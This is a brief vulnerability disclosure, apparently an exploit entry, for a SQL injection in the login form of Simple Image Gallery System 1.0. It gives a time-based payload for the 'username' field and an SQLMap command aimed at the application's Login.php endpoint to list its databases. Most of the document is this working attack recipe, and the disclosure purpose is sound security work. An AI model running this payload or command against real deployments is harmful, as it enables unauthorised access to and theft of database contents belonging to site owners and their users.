# Description:
The Simple Image Gallery System 1.0 application is vulnerable to SQL injection through the "username" parameter in the authentication form.

# Proof of Concept:
Use the following payload in the "**username**" field and type any password.
```bash
'oR sLEeP(10);#
```

### Exploiting
Once it is evident that the loading of the site takes *10 seconds*, we can execute the following command with the **SQLMap** tool:
``` bash
sqlmap -u "http://[IP/HOST]:PORT/gallery/classes/Login.php?f=login" --data "username=admin&password=123456" --dbs --batch
```
